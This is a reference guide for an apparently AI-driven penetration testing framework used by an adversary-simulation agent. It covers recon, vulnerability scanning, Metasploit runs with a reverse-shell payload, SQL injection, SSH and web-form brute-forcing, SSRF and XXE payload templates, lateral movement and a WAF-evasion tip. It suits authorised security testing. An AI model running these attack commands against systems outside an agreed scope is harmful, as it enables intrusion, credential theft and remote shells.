# RedAmon Integration Reference

**GRIMSEC Agent 12 — Adversary Simulation Agent**

RedAmon is an autonomous penetration testing framework that combines AI-driven attack chain reasoning, a multi-tool offensive toolkit, and a Neo4j-backed attack surface graph (EvoGraph) into a single orchestration layer.

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    RedAmon Core                          │
│                                                         │
│  ┌──────────┐   ┌──────────┐   ┌──────────────────┐   │
│  │  Recon   │   │  AI Agent│   │  EvoGraph (Neo4j)│   │
│  │ Pipeline │──▶│  Planner │──▶│  Attack Chains   │   │
│  └──────────┘   └──────────┘   └──────────────────┘   │
│       │               │                │               │
│  ┌────▼───────────────▼────────────────▼──────────┐    │
│  │           Tool Dispatcher                       │    │
│  │  Metasploit │ Hydra │ SQLMap │ Nuclei │ Custom  │    │
│  └────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
```

---

## Installation

```bash
# Install via setup-redamon.sh (preferred)
./scripts/setup-redamon.sh

# Or manually
git clone https://github.com/grimsec/redamon ~/.redamon
pip install -r ~/.redamon/requirements.txt
ln -sf ~/.redamon/redamon.sh /usr/local/bin/redamon.sh
```

---

## redamon.sh CLI Reference

### Global Flags

| Flag | Description | Default |
|------|-------------|---------|
| `--config FILE` | Config YAML path | `~/.redamon/config/grimsec.yaml` |
| `--output-dir DIR` | Base output directory | `adversary-simulation/` |
| `--neo4j-uri URI` | Neo4j connection | `bolt://localhost:7687` |
| `--neo4j-user USER` | Neo4j username | `neo4j` |
| `--neo4j-pass PASS` | Neo4j password | env `NEO4J_PASS` |
| `--log-level LEVEL` | `debug\|info\|warn\|error` | `info` |
| `--dry-run` | Print actions without executing | false |

---

## Recon Pipeline

### Subdomain Enumeration

```bash
./redamon.sh recon \
  --target example.com \
  --mode subdomain-enum \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --resolvers 8.8.8.8,1.1.1.1 \
  --timeout 60 \
  --output recon/subdomains.json
```

Output schema:
```json
{
  "target": "example.com",
  "subdomains": [
    {"fqdn": "api.example.com", "ip": "10.0.0.1", "cname": null}
  ],
  "total_discovered": 42
}
```

### Port Scanning + Service Detection

```bash
./redamon.sh recon \
  --target recon/subdomains.json \
  --mode portscan \
  --ports top-1000 \
  --service-detection true \
  --os-detection false \
  --output recon/ports.json
```

Output schema:
```json
{
  "hosts": [
    {
      "ip": "10.0.0.1",
      "hostname": "api.example.com",
      "open_ports": [
        {"port": 443, "protocol": "tcp", "service": "https", "version": "nginx/1.24.0"}
      ]
    }
  ]
}
```

### HTTP Probing + Technology Fingerprinting

```bash
./redamon.sh recon \
  --target recon/subdomains.json \
  --mode http-probe \
  --wappalyzer \
  --follow-redirects \
  --screenshot false \
  --output recon/tech-stack.json
```

Wappalyzer categories detected: `web-frameworks`, `javascript-frameworks`, `databases`, `cdn`, `web-servers`, `authentication`, `paas`, `cms`.

### JavaScript Recon (100 Pattern Engine)

```bash
./redamon.sh recon \
  --target recon/http-hosts.json \
  --mode js-recon \
  --patterns 100 \
  --depth 3 \
  --extract-endpoints \
  --extract-secrets \
  --output recon/endpoints.json
```

Extracts:
- API endpoints (REST paths, GraphQL schemas)
- Hardcoded secrets (API keys, tokens, passwords)
- Internal IP addresses
- S3 bucket references
- JWT patterns
- Cloud metadata URLs

Output schema:
```json
{
  "endpoints_found": 187,
  "endpoints": [
    {"method": "POST", "path": "/api/v1/users", "params": ["email", "password"]}
  ],
  "secrets": [
    {"type": "aws_access_key", "value": "AKIA...", "source_file": "app.bundle.js"}
  ]
}
```

### Nuclei Vulnerability Scan

```bash
./redamon.sh scan \
  --target recon/http-hosts.json \
  --templates all \
  --severity medium,high,critical \
  --exclude-tags dos,fuzzing \
  --rate-limit 150 \
  --retries 2 \
  --output recon/nuclei-results.json \
  --json-export recon/nuclei-raw.jsonl
```

> **Note**: Always use `--exclude-tags dos` to prevent denial-of-service templates from firing. This is enforced by default in the GRIMSEC config.

Template categories: `cves`, `vulnerabilities`, `exposures`, `misconfiguration`, `default-logins`, `technologies`, `network`, `ssl`.

---

## Graph Operations (EvoGraph)

EvoGraph is RedAmon's Neo4j-backed evolutionary attack graph. It models the attack surface as a property graph where nodes represent assets/findings and edges represent exploitation relationships.

### Import Recon to Neo4j

```bash
./redamon.sh graph \
  --import recon/ \
  --neo4j-uri bolt://localhost:7687 \
  --neo4j-user neo4j \
  --neo4j-pass $NEO4J_PASS \
  --label-prefix grimsec_
```

### Query Attack Paths

```bash
# Find all paths from external entry point to sensitive data
./redamon.sh graph --query \
  "MATCH p = (entry:ExternalHost)-[:EXPLOITS*1..5]->(data:SensitiveData) RETURN p LIMIT 10"

# Get exploitation chain for a specific target
./redamon.sh graph --query \
  "MATCH (n:ExploitAttempt {success: true})-[:LED_TO*]->(m) RETURN n, m ORDER BY n.timestamp"
```

### Add EvoGraph Node (from run-simulation.py)

```bash
./redamon.sh graph --add-node '{"node_type":"exploit_attempt","target":"api.example.com","success":true}'
# Returns: node_id (UUID)
```

---

## Exploitation Modules

### Metasploit Integration

```bash
# Run single module via RedAmon
./redamon.sh exploit \
  --module metasploit \
  --msf-module exploit/unix/webapp/drupal_drupalgeddon2 \
  --target 10.0.0.1 \
  --port 80 \
  --payload cmd/unix/reverse_bash \
  --lhost 127.0.0.1 \
  --output exploitation-log/msf-result.json

# Start MSF RPC daemon (for programmatic access)
msfrpcd -P grimsec-rpc-pass -S -a 127.0.0.1 -p 55553
```

### SQLMap Integration

```bash
# POST parameter injection
./redamon.sh exploit \
  --module sqlmap \
  --url "http://target/login" \
  --data "user=admin&pass=test" \
  --level 3 --risk 2 \
  --batch \
  --dbms mysql \
  --output exploitation-log/sqlmap-result.json

# GET parameter with cookie
./redamon.sh exploit \
  --module sqlmap \
  --url "http://target/search?q=test" \
  --cookie "session=abc123" \
  --dbs \
  --batch
```

### Hydra Integration

```bash
# HTTP form brute-force
./redamon.sh exploit \
  --module hydra \
  --target target.example.com \
  --service http-post-form \
  --form-path "/login" \
  --form-body "username=^USER^&password=^PASS^" \
  --form-fail "Invalid credentials" \
  --users recon/users.txt \
  --passwords references/wordlists/top-1000.txt \
  --threads 4 \
  --output exploitation-log/hydra-result.json

# SSH brute-force
./redamon.sh exploit \
  --module hydra \
  --target 10.0.0.1 \
  --service ssh \
  --users recon/users.txt \
  --passwords references/wordlists/top-1000.txt
```

### Container Escape Module

```bash
# Test for container escape vectors
./redamon.sh exploit \
  --module container-escape \
  --target 10.0.0.1 \
  --check-only \
  --output exploitation-log/container-escape.json

# Vectors tested:
#   - Privileged container + /proc/sysrq-trigger
#   - Docker socket exposure (/var/run/docker.sock)
#   - Host path volume mounts
#   - CAP_SYS_ADMIN capabilities
#   - nsenter from PID namespace
```

### Dependency Hijack (Supply Chain) Module

```bash
./redamon.sh exploit \
  --module dependency-hijack \
  --target recon/tech-stack.json \
  --check-typosquatting \
  --check-abandoned \
  --output exploitation-log/supply-chain.json
```

---

## Custom Payload Engine

For application-specific vulnerabilities (JWT forgery, SSRF, WebSocket CSRF):

```bash
./redamon.sh exploit \
  --module custom-payload \
  --vuln-type JWT \
  --target api.example.com \
  --endpoint /api/v1/admin \
  --evidence '{"algorithm":"HS256","secret_exposed":true}' \
  --payload-template references/payloads/jwt-none-alg.json \
  --output exploitation-log/jwt-result.json
```

### Available Payload Templates

| Template | Vuln Type | Description |
|----------|-----------|-------------|
| `jwt-none-alg.json` | JWT | Algorithm confusion (none/HS256→RS256) |
| `ssrf-aws-metadata.json` | SSRF | AWS IMDSv1 metadata fetch |
| `ssrf-internal-scan.json` | SSRF | Internal subnet enumeration |
| `cswsh-payload.html` | WebSocket | Cross-Site WebSocket Hijacking |
| `xxe-file-read.xml` | XXE | Local file inclusion via XXE |
| `ssti-detection.txt` | SSTI | Server-side template injection detection |

---

## Post-Exploitation Modules

```bash
# Lateral movement assessment
./redamon.sh post-exploit \
  --mode lateral-movement \
  --compromised-host 10.0.0.5 \
  --network-map recon/ports.json \
  --output post-exploit/lateral-movement.json

# Privilege escalation assessment
./redamon.sh post-exploit \
  --mode privesc \
  --compromised-host 10.0.0.5 \
  --output post-exploit/privesc.json

# Data access enumeration (metadata only — no actual data read)
./redamon.sh post-exploit \
  --mode data-enumeration \
  --compromised-host 10.0.0.5 \
  --metadata-only \
  --output post-exploit/data-access.json
```

---

## Emergency Stop

If exploitation produces unexpected impact or scope boundary is approached:

```bash
# Immediate full stop — terminates all RedAmon processes and sub-tools
./redamon.sh down

# Soft stop — finishes current operation then halts
./redamon.sh stop

# Status check
./redamon.sh status
```

---

## Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `NEO4J_URI` | Yes (if using graph) | `bolt://localhost:7687` |
| `NEO4J_USER` | Yes | Neo4j username |
| `NEO4J_PASS` | Yes | Neo4j password |
| `REDAMON_API_KEY` | No | RedAmon cloud API key |
| `OPENAI_API_KEY` | No | AI planner API key |
| `MSF_RPC_PASS` | No | Metasploit RPC password |

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `neo4j connection refused` | Check container: `docker ps | grep redamon-neo4j` |
| `nuclei: no templates` | Run `nuclei -update-templates` |
| `msfconsole not found` | Use Docker wrapper — see `setup-redamon.sh` |
| `hydra: target unreachable` | Verify scope + firewall rules |
| `sqlmap: WAF detected` | Add `--tamper=space2comment` or reduce rate |
| `EvoGraph node not found` | Re-run `./redamon.sh graph --import recon/` |
